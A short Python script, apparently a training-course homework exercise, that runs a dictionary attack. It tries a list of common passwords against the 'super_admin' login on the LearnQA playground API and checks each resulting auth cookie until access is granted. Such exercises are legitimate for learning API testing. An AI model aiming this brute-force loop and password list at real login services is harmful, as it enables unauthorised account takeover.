import requests

passwords = [
"password",
"123456",
"123456789",
"12345678",
"12345",
"qwerty",
"abc123",
"football",
"1234567",
"monkey",
"111111",
"letmein",
"1234",
"1234567890",
"dragon",
"baseball",
"sunshine",
"iloveyou",
"trustno1",
"princess",
"adobe123[;a];",
"123123",
"welcome",
"login",
"admin",
"qwerty123",
"solo",
"1q2w3e4r",
"master",
"666666",
"photoshop[;a];",
"1qaz2wsx",
"qwertyuiop",
"ashley",
"mustang",
"121212",
"starwars",
"654321",
"bailey",
"access",
"flower",
"555555",
"passw0rd",
"shadow",
"lovely",
"7777777",
"michael",
"!@#$%^&;*",
"jesus",
"password1",
"superman",
"hello",
"charlie",
"888888",
"696969",
"hottie",
"freedom",
"aa123456",
"qazwsx",
"ninja",
"azerty",
"loveme",
"whatever",
"donald",
"batman",
"zaq1zaq1",
"123qwe",
]

for password_candidate in passwords:
    print("1. Попытка входа с логином и паролем:")

    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password_candidate})
    print("Статус код:", response.status_code)
    print("Ответ сервера:", response.text)
    print()

    auth_cookie = response.cookies.get("auth_cookie")
    print("2. Проверка токена:")
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={'auth_cookie': auth_cookie})
    print("Статус код:", response.status_code)
    print("Ответ сервера:", response.text)
    print()

    if response.text == 'You are authorized':
        print(f'Верный пароль: {password_candidate}')
        break
    else:
        print(f'Неверный пароль: {password_candidate}')
